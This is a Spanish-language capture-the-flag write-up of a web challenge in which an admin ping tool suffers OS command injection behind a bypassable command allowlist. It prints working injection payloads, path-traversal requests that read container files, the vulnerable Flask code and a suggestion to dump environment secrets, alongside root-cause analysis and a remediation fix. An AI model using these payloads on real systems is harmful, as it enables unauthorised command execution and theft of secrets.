# Apuntes 4

| Campo | Detalle |
|---|---|
| **Categoría** | Web |
| **Puntos** | 300 |
| **Autor** | Lychi3 |
| **Objetivo** | `http://3.236.190.110` |
| **Descripción** | *"Esto deberia ser seguro"* |
| **Vulnerabilidad** | OS Command Injection en la herramienta de ping (filtro por lista blanca evadible) |
| **CWE** | CWE-78 (Improper Neutralization of Special Elements used in an OS Command) |
| **OWASP** | A03:2021 – Injection |

## 1. Reconocimiento

El panel admin (obtenido en [Apuntes 2](../apuntes-2/README.md)) incluye la herramienta **"Ping - Diagnostico de red"**:

```text
$ curl -s -b "session=$COOKIE" http://3.236.190.110/admin/tools
```

```html
<h2>Diagnostico de red</h2>
<p class="muted">Ingresa un host para verificar conectividad.</p>
<form method="POST">
    <input type="text" name="host" placeholder="Ej: 127.0.0.1" required>
    <button type="submit" class="btn">Ping</button>
</form>
```

Hay un parámetro `host` enviado por POST, y es casi seguro que el servidor lo pasa al comando `ping`.

## 2. Análisis

### 2.1 Confirmar la inyección

```bash
curl -s -b "session=$COOKIE" --data-urlencode 'host=127.0.0.1; cat /flag.txt' \
     http://3.236.190.110/admin/tools
```

```text
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=127 time=0.040 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=127 time=0.041 ms

--- 127.0.0.1 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1008ms
rtt min/avg/max/mdev = 0.040/0.040/0.041/0.000 ms
cat: /flag.txt: No such file or directory
```

El `cat` **se ejecutó**: el error `cat: /flag.txt: No such file or directory` lo confirma. Hay inyección de comandos, aunque `/flag.txt` no existe. Los dos paquetes indican que el comando base es `ping -c 2 <host>`.

### 2.2 Enumerar el sistema

```bash
curl -s -b "session=$COOKIE" --data-urlencode 'host=127.0.0.1; ls -la /' \
     http://3.236.190.110/admin/tools
```

```text
total 8
drwxr-xr-x.   1 root root  48 Nov 20 02:59 .
drwxr-xr-x.   1 root root  48 Nov 20 02:59 ..
-rwxr-xr-x.   1 root root   0 Nov 20 02:59 .dockerenv
drwxr-xr-x.   1 root root  21 Nov 20 02:59 app
-rwxr-xr-x.   1 root root 202 Nov 20 02:42 entrypoint.sh
-rw-r--r--.   1 root root  29 Nov 20 02:59 flag_lfi.txt
drwx------.   1 root root  24 Nov  5 07:57 root
drwxr-xr-x.   1 root root  21 Nov  4 21:23 var
...
```

| Hallazgo | Significado |
|---|---|
| `/.dockerenv` | La aplicación corre dentro de un contenedor Docker |
| `/app` | Código fuente de la aplicación Flask |
| `/entrypoint.sh` | Script de arranque del contenedor: dice dónde se escriben las banderas |
| `/flag_lfi.txt` | Bandera de otro reto (el nombre indica LFI → [Apuntes 5](../apuntes-5/README.md)) |

### 2.3 Ingeniería inversa del filtro

Algunos payloads devolvían `Comando no permitido`. El código fuente de `/app/app.py` (leído con el LFI de Apuntes 5) muestra el filtro:

```python
ALLOWED_CMDS = {"ping", "cat", "ls", "whoami", "id", "pwd", "head", "tail"}

def cmd_is_safe(raw):
    if "`" in raw or "$(" in raw or ">" in raw:
        return False
    for part in re.split(r"[;|&\n]", raw):
        part = part.strip()
        if not part:
            continue
        first = part.split()[0]
        if first not in ALLOWED_CMDS:
            return False
    return True
```

El filtro hace tres cosas:

1. Bloquea `` ` ``, `$(` y `>`.
2. Parte la entrada por `;`, `|`, `&` y saltos de línea.
3. Exige que **la primera palabra** de cada parte esté en la lista blanca.

Hay que notar que **no bloquea los separadores**: solo revisa qué comando viene después de cada uno. Con eso se explican todos los resultados de las pruebas:

| Payload (`host=`) | Resultado | Por qué |
|---|---|---|
| `127.0.0.1; cat /flag.txt` | ✅ ejecuta | `cat` está permitido |
| `127.0.0.1; ls -la /` | ✅ ejecuta | `ls` está permitido |
| `127.0.0.1 && cat /flag_lfi.txt` | ✅ ejecuta | `&&` se parte por `&`; `cat` permitido |
| `127.0.0.1\|cat /flag_lfi.txt` | ✅ ejecuta | `\|` también es separador válido |
| `127.0.0.1; grep -r AHAU / 2>/dev/null` | ❌ bloqueado | `grep` no está en la lista y contiene `>` |
| `127.0.0.1; cat /flag_lfi.txt; echo END` | ❌ bloqueado | `echo` no está en la lista |
| `127.0.0.1; ... find / -name "flag*" 2>/dev/null` | ❌ bloqueado | `find` no permitido y `>` |
| `1; cat /flag_lfi.txt` | ⚠️ sin salida | `ping 1` → `0.0.0.1` no responde, se excede el `timeout=5` y solo se muestra "Timeout" |

## 3. Explotación

### 3.1 Localizar la bandera

El `entrypoint.sh` (202 bytes) muestra dónde se escribe cada bandera al arrancar el contenedor:

```text
$ curl -s -b "session=$COOKIE" \
  "http://3.236.190.110/admin/report?file=../../../../entrypoint.sh" | grep FLAG
FLAG_WEB4" ]; then
FLAG_WEB4" > /var/backups/old/2024/config/master.txt
FLAG_WEB5" ]; then
FLAG_WEB5" > /flag_lfi.txt
```

En `app.py` las variables de entorno se llaman así:

```python
FLAG4 = os.environ.get("FLAG_WEB4", "CTF{command_injection_ping_pong}")
FLAG5 = os.environ.get("FLAG_WEB5", "CTF{lfi_path_traversal_read}")
```

- `FLAG_WEB4` → **command injection** → `/var/backups/old/2024/config/master.txt`
- `FLAG_WEB5` → LFI → `/flag_lfi.txt`

> Los valores `CTF{...}` del código son **señuelos**: solo se usan si la variable de entorno no existe. Las banderas reales vienen del entorno del contenedor.

### 3.2 Leer la bandera

En la sesión se leyó con el endpoint de reportes:

```text
$ curl -s -b "session=$COOKIE" \
  "http://3.236.190.110/admin/report?file=../../../../var/backups/old/2024/config/master.txt"
AHAU{w0w_y0u_1nj3ct3d_a_c0mm4nd}
```

La misma lectura se puede hacer con la inyección, porque `cat` está en la lista blanca:

```bash
curl -s -b "session=$COOKIE" \
  --data-urlencode 'host=127.0.0.1; cat /var/backups/old/2024/config/master.txt' \
  http://3.236.190.110/admin/tools | grep -oE 'AHAU\{[^}]+\}'
```

> **Nota:** al principio se envió `AHAU{lfi_4r3_d4ng3r0us_guys}` como bandera de este reto y fue rechazada (`Incorrect`). Esa es la bandera del LFI (Apuntes 5). La correspondencia `FLAG_WEB4` → command injection aclaró cuál iba en cada reto.

## 4. Causa raíz

```python
cmd = "ping -c 2 " + host                # concatenación de input del usuario
if cmd_is_safe(cmd):
    result = subprocess.run(
        cmd, shell=True,                  # la shell interpreta ; | &&
        capture_output=True, text=True, timeout=5
    )
```

- `shell=True` hace que `/bin/sh` interprete los metacaracteres.
- Un filtro por **lista negra o blanca de comandos** es frágil: aunque solo permite comandos "inofensivos", `cat` basta para leer cualquier archivo y `ls` para enumerar el sistema.

## 5. Impacto

- Ejecución de comandos en el contenedor con los permisos del proceso Flask.
- Lectura de cualquier archivo al alcance (código fuente, configuración, secretos, banderas).
- Con `cat /proc/self/environ` se pueden leer **todas las variables de entorno**, incluidas las demás banderas y secretos.

## 6. Remediación

No usar shell. Validar que la entrada sea una IP y pasar los argumentos como lista:

```python
import ipaddress, subprocess

@app.route("/admin/tools", methods=["POST"])
@admin_required
def tools():
    host = request.form.get("host", "").strip()
    try:
        ip = ipaddress.ip_address(host)          # solo IPs válidas
    except ValueError:
        return render_template("tools.html", output="Host inválido"), 400

    result = subprocess.run(
        ["ping", "-c", "2", str(ip)],            # sin shell, sin interpolación
        capture_output=True, text=True, timeout=5
    )
    return render_template("tools.html", output=result.stdout)
```

Además:

- Ejecutar el contenedor como usuario sin privilegios (`USER app` en el Dockerfile).
- No dejar secretos en archivos del contenedor que la aplicación pueda leer.

## 🚩 Flag

```text
AHAU{w0w_y0u_1nj3ct3d_a_c0mm4nd}
```

---
[⬅ Apuntes 3](../apuntes-3/README.md) · [Índice](../../README.md) · [Apuntes 5 ➡](../apuntes-5/README.md)
